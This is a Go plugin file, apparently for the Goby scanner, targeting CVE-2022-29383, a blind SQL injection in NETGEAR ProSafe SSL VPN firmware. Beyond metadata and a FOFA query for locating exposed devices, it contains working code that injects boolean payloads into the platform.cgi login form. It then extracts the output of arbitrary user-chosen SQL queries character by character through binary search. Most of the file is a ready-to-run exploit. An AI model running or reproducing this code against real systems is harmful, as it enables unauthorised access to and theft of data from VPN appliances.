package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NETGEAR ProSafe SSL VPN firmware platform.cgi Boolean SQLi(CVE-2022-29383)",
    "Description": "<p>NETGEAR ProSafe SSL VPN firmware FVS336Gv2 and FVS336Gv3 was discovered to contain a SQL injection vulnerability via USERDBDomains.Domainname at cgi-bin/platform.cgi.</p>",
    "Impact": "NETGEAR ProSafe SSL VPN firmware platform.cgi Boolean SQLi(CVE-2022-29383)",
    "Recommendation": "<p>At present, the manufacturer has not released repair measures to solve this security problem. Users using this software are advised to follow the manufacturer's home page or reference website at any time to obtain solutions:<a href=\"https://www.netgear.com/about/security/\">https://www.netgear.com/about/security/</a></p>",
    "Product": "NETGEAR ProSafe SSL VPN firmware",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "NETGEAR ProSafe SSL VPN firmware platform.cgi SQL盲注漏洞（CVE-2022-29383）",
            "Description": "<p>NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。</p><p>NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname缺少过滤转义，攻击者利用该漏洞可进行SQL注入攻击。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<span style=\"color: var(--primaryFont-color);\"><a href=\"https://www.netgear.com/about/security/\">https://www.netgear.com/about/security/</a></span></p>",
            "Product": "NETGEAR ProSafe SSL VPN防火墙",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "NETGEAR ProSafe SSL VPN firmware platform.cgi Boolean SQLi(CVE-2022-29383)",
            "Description": "<p>NETGEAR ProSafe SSL VPN firmware FVS336Gv2 and FVS336Gv3 was discovered to contain a SQL injection vulnerability via USERDBDomains.Domainname at cgi-bin/platform.cgi.<br></p>",
            "Impact": "NETGEAR ProSafe SSL VPN firmware platform.cgi Boolean SQLi(CVE-2022-29383)",
            "Recommendation": "<p>At present, the manufacturer has not released repair measures to solve this security problem. Users using this software are advised to follow the manufacturer's home page or reference website at any time to obtain solutions:<a href=\"https://www.netgear.com/about/security/\">https://www.netgear.com/about/security/</a><br></p>",
            "Product": "NETGEAR ProSafe SSL VPN firmware",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "title=\"ProSafe\" && body=\"platform.cgi\"",
    "GobyQuery": "title=\"ProSafe\" && body=\"platform.cgi\"",
    "Author": "corp0ra1",
    "Homepage": "https://www.netgear.com",
    "DisclosureDate": "2022-05-13",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29383",
        "https://github.com/badboycxcc/Netgear-ssl-vpn-20211222-CVE-2022-29383",
        "https://www.netgear.com/about/security/",
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202205-3298"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2022-29383"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202205-3298"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "createSelect",
            "value": "select hex('a'),select sqlite_version()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	runSqliPayloadweoqiweoq := func(hostinfo *httpclient.FixUrl, sqliPayload string) int {
		cfg := httpclient.NewPostRequestConfig("/scgi-bin/platform.cgi")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = fmt.Sprintf(`thispage=index.htm&USERDBUsers.UserName=&USERDBUsers.Password=&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla&USERDBDomains.Domainname=geardomain'and+1%%3d(case+when(%s)+then+1+else+0+end)--+`, sqliPayload)
		if resp1, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
			if strings.Contains(resp1.RawBody, "User Login Failed for SSLVPN User") {
				return 1
			} else if strings.Contains(resp1.RawBody, "User authentication Failed. Use the correct SSL portal URL to login") {
				return 0
			}
		}
		return -1
	}
	binarySearchewqekbll := func(hostinfo *httpclient.FixUrl, payload string, left, right, chrFlag int) int {
		var mid int
		var ret int
		var payloadTmp string
		for left != right {
			mid = (left + right) / 2
			if chrFlag == 1 {
				payloadTmp = fmt.Sprintf(payload, string(mid))
			} else {
				payloadTmp = fmt.Sprintf(payload, mid)
			}
			fmt.Println(payloadTmp)
			ret = runSqliPayloadweoqiweoq(hostinfo, payloadTmp)
			if ret == 1 {
				left = mid + 1
			} else if ret == 0 {
				right = mid
			} else {
				return -1
			}
		}
		return left
	}
	getSqliPayloaddwahndw := func(hostinfo *httpclient.FixUrl, sqlQuery string) string {
		var ret int
		getLenPayload := fmt.Sprintf(`length((%s))>`, sqlQuery) + "%d"
		ret = binarySearchewqekbll(hostinfo, getLenPayload, 0, 50, 0)
		if ret == -1 {
			return "An unexpected error was found during SQL injection,Please check whether your SQL statement is entered correctly"
		}
		len := ret
		fmt.Println(len)
		data := ""
		getDataPayload := fmt.Sprintf("substr((%s),{{{N}}},1) >", sqlQuery)
		for i := 1; i <= len; i++ {
			payloadTmp := strings.ReplaceAll(getDataPayload, "{{{N}}}", strconv.Itoa(i)) + "'%s'"
			ret = binarySearchewqekbll(hostinfo, payloadTmp, 32, 126, 1)
			if ret == -1 {
				return "{{{error}}}"
			}
			data += string(ret)
			fmt.Println(data)
		}
		return data
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/scgi-bin/platform.cgi")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			payload := "thispage=index.htm&USERDBUsers.UserName=&USERDBUsers.Password=&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla&USERDBDomains.Domainname=geardomain'and+"
			cfg.Data = payload + url.QueryEscape("'1'='1")
			if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.Utf8Html, "User Login Failed for SSLVPN User.") {
					cfg.Data = payload + url.QueryEscape("'1'='2")
					if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, "User authentication Failed. Use the correct SSL portal URL to login") {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqlQuery := ss.Params["sqlQuery"].(string)
			expResult.Output = getSqliPayloaddwahndw(expResult.HostInfo, sqlQuery)
			if expResult.Output == "{{{error}}}" {
				expResult.Output = "An unexpected error was found during SQL injection,Please check whether your SQL statement is entered correctly"
				expResult.Success = false
			}
			expResult.Success = true
			return expResult
		},
	))
}
